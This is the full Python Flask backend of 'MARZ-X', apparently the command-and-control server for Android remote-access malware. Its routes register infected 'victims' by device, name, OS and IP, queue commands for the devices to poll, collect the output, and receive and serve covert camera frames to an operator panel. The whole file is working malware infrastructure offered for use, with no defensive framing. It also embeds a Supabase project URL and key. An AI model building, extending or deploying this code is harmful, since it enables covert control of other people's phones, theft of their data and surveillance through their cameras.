import os
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from supabase import create_client, Client

app = Flask(__name__)
CORS(app)

# ===== AMBIL KREDENSIAL DARI ENVIRONMENT =====
SUPABASE_URL = os.environ.get("https://exzpctjvnjksubmjqtfv.supabase.co")
SUPABASE_KEY = os.environ.get("sb_publishable_eY3Lqocmx5GafVMGOmBdTg_BnqEiyiQ")

# ===== INISIALISASI SUPABASE CLIENT (DENGAN ERROR HANDLING) =====
supabase = None
if SUPABASE_URL and SUPABASE_KEY:
    try:
        supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
        print("Supabase connected successfully")
    except Exception as e:
        print(f"Supabase connection error: {e}")
        supabase = None
else:
    print("Supabase credentials not set in environment variables")

# =============================================
# ROUTE REGISTER (Client APK panggil saat pertama kali)
# =============================================
@app.route('/api/register', methods=['POST'])
def register_victim():
    if supabase is None:
        return jsonify({"error": "Database not available"}), 500

    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400

    user_id = data.get('user_id')
    device_id = data.get('device_id')
    device_name = data.get('device_name', 'Unknown Device')
    os_version = data.get('os', 'Unknown OS')
    ip = data.get('ip', request.remote_addr)

    if not user_id or not device_id:
        return jsonify({"error": "user_id and device_id required"}), 400

    # Cek apakah device sudah terdaftar
    existing = supabase.table('victims').select('*').eq('id', device_id).execute()
    if existing.data:
        # Update data
        supabase.table('victims').update({
            'name': device_name,
            'os': os_version,
            'ip': ip,
            'status': 'online'
        }).eq('id', device_id).execute()
    else:
        # Insert baru
        supabase.table('victims').insert({
            'id': device_id,
            'user_id': user_id,
            'name': device_name,
            'os': os_version,
            'ip': ip,
            'status': 'online'
        }).execute()

    return jsonify({"status": "registered"})

# =============================================
# ROUTE GET VICTIMS (Panel panggil)
# =============================================
@app.route('/api/victims', methods=['GET'])
def get_victims():
    if supabase is None:
        return jsonify({"error": "Database not available"}), 500

    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id required"}), 400

    res = supabase.table('victims').select('*').eq('user_id', user_id).execute()
    return jsonify(res.data)

# =============================================
# ROUTE SEND COMMAND (Panel kirim perintah)
# =============================================
@app.route('/api/cmd', methods=['POST'])
def send_command():
    if supabase is None:
        return jsonify({"error": "Database not available"}), 500

    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400

    user_id = data.get('user_id') or request.headers.get('X-User-ID')
    victim_id = data.get('victim_id')
    command = data.get('command')

    if not user_id or not victim_id or not command:
        return jsonify({"error": "missing fields"}), 400

    # Simpan ke tabel commands
    supabase.table('commands').insert({
        'victim_id': victim_id,
        'command': command
    }).execute()

    # Tambahkan ke results dengan status pending
    supabase.table('results').insert({
        'victim_id': victim_id,
        'command': command,
        'result': 'pending...',
        'status': 'pending'
    }).execute()

    return jsonify({"status": "ok"})

# =============================================
# ROUTE CLIENT POLLING COMMAND
# =============================================
@app.route('/api/command/<victim_id>', methods=['GET'])
def get_command(victim_id):
    if supabase is None:
        return jsonify({"action": "none"}), 500

    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify({"action": "none"}), 400

    # Ambil command pertama yang pending
    res = supabase.table('commands').select('*').eq('victim_id', victim_id).order('created_at').limit(1).execute()
    if res.data:
        cmd = res.data[0]
        # Hapus setelah diambil
        supabase.table('commands').delete().eq('id', cmd['id']).execute()
        return jsonify({"action": cmd['command']})
    else:
        return jsonify({"action": "none"})

# =============================================
# ROUTE CLIENT SEND RESULT
# =============================================
@app.route('/api/result', methods=['POST'])
def receive_result():
    if supabase is None:
        return jsonify({"error": "Database not available"}), 500

    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400

    user_id = data.get('user_id') or request.headers.get('X-User-ID')
    victim_id = data.get('victim_id')
    command = data.get('command')
    result = data.get('result')
    status = data.get('status', 'done')

    if not user_id or not victim_id or not command:
        return jsonify({"error": "missing fields"}), 400

    # Cari log pending
    res = supabase.table('results').select('*').eq('victim_id', victim_id).eq('command', command).eq('status', 'pending').order('time', desc=True).limit(1).execute()
    if res.data:
        supabase.table('results').update({
            'result': result,
            'status': status,
            'time': datetime.now().isoformat()
        }).eq('id', res.data[0]['id']).execute()
    else:
        # Jika tidak ada pending, buat baru
        supabase.table('results').insert({
            'victim_id': victim_id,
            'command': command,
            'result': result,
            'status': status
        }).execute()

    return jsonify({"status": "ok"})

# =============================================
# ROUTE GET LOGS (Panel lihat hasil)
# =============================================
@app.route('/api/results/<victim_id>', methods=['GET'])
def get_results(victim_id):
    if supabase is None:
        return jsonify([]), 500

    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify([]), 400

    res = supabase.table('results').select('*').eq('victim_id', victim_id).order('time', desc=True).execute()
    return jsonify(res.data)

# =============================================
# ROUTE STREAMING (Camera)
# =============================================
@app.route('/api/stream/camera', methods=['POST'])
def stream_camera():
    if supabase is None:
        return jsonify({"error": "Database not available"}), 500

    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400

    user_id = data.get('user_id') or request.headers.get('X-User-ID')
    victim_id = data.get('device_id')
    frame = data.get('frame')

    if not user_id or not victim_id:
        return jsonify({"error": "missing user_id or device_id"}), 400

    supabase.table('streams').upsert({
        'victim_id': victim_id,
        'camera': frame,
        'updated_at': datetime.now().isoformat()
    }).execute()

    return jsonify({"status": "ok"})

@app.route('/api/stream/<victim_id>/camera', methods=['GET'])
def get_camera_stream(victim_id):
    if supabase is None:
        return jsonify({"error": "Database not available"}), 500

    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "missing user"}), 400

    res = supabase.table('streams').select('camera').eq('victim_id', victim_id).execute()
    if res.data and res.data[0].get('camera'):
        return jsonify({"frame": res.data[0]['camera']})
    else:
        return jsonify({"error": "no frame"}), 404

# =============================================
# ROUTE HEALTH CHECK
# =============================================
@app.route('/')
def home():
    return "MARZ-X Backend Running!"

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
